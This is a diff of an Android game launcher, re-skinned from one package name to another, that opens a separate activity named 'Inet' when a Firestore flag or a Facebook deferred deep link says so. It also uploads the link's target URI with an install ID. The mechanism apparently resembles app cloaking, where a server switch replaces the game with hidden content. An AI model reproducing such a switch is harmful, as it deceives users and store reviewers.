@@ -1,4 +1,4 @@
-package com.timmytimmysave.savethetimmy;
+package com.spaceplanee.spaceplanee;
 
 import android.content.Context;
 import android.content.Intent;
@@ -8,20 +8,17 @@ import android.os.Bundle;
 import android.widget.Toast;
 
 import androidx.annotation.Nullable;
-import androidx.appcompat.app.AppCompatActivity;
 
 import com.badlogic.gdx.backends.android.AndroidApplication;
 import com.badlogic.gdx.backends.android.AndroidApplicationConfiguration;
 import com.facebook.FacebookSdk;
 import com.facebook.applinks.AppLinkData;
-import com.google.firebase.FirebaseApp;
 import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.DocumentSnapshot;
 import com.google.firebase.firestore.EventListener;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.google.firebase.firestore.FirebaseFirestoreException;
 import com.onesignal.OneSignal;
-import com.timmytimmysave.savethetimmy.timmytimmysave;
 
 import java.util.UUID;
 
@@ -49,10 +46,10 @@ public class AndroidLauncher extends AndroidApplication {
 		facebook(this, installID);
 		String karam = sharedPreferences.getString("param", "");
 		assert karam != null;
-		if(!karam.equals("")){
-			Intent intent = new Intent(this, bewbewbew.class);
-			startActivity(intent);
-		}
+		if(!karam.equals("")) {
+            Intent intent = new Intent(this, Inet.class);
+            startActivity(intent);
+        }
 		AndroidApplicationConfiguration config = new AndroidApplicationConfiguration();
 		initialize(new timmytimmysave(), config);
 	}
@@ -79,11 +76,11 @@ public class AndroidLauncher extends AndroidApplication {
 					if (value.exists()) {
 						param = value.getString("name");
 						String response = value.getString("response");
-						if(param != null && response != null){
-							Intent intent = new Intent(AndroidLauncher.this, bewbewbew.class);
-							sharedPreferences.edit().putString("param", param).apply();
-							startActivity(intent);
-						}
+						if(param != null && response != null) {
+                            Intent intent = new Intent(AndroidLauncher.this, Inet.class);
+                            sharedPreferences.edit().putString("param", param).apply();
+                            startActivity(intent);
+                        }
 					}
 				}
 			});
@@ -100,13 +97,13 @@ public class AndroidLauncher extends AndroidApplication {
 						@Override
 						public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
 							if (appLinkData != null) {
-								Intent intent = new Intent(AndroidLauncher.this, bewbewbew.class);
-								Uri targetUri = appLinkData.getTargetUri();
-								assert targetUri != null;
-								firebaseSettings.storeUpload(context, targetUri.toString());
-								intent.putExtra("id", installID);
-								startActivity(intent);
-							}
+                                Intent intent = new Intent(AndroidLauncher.this, Inet.class);
+                                Uri targetUri = appLinkData.getTargetUri();
+                                assert targetUri != null;
+                                firebaseSettings.storeUpload(context, targetUri.toString());
+                                intent.putExtra("id", installID);
+                                startActivity(intent);
+                            }
 						}
 					}
 			);
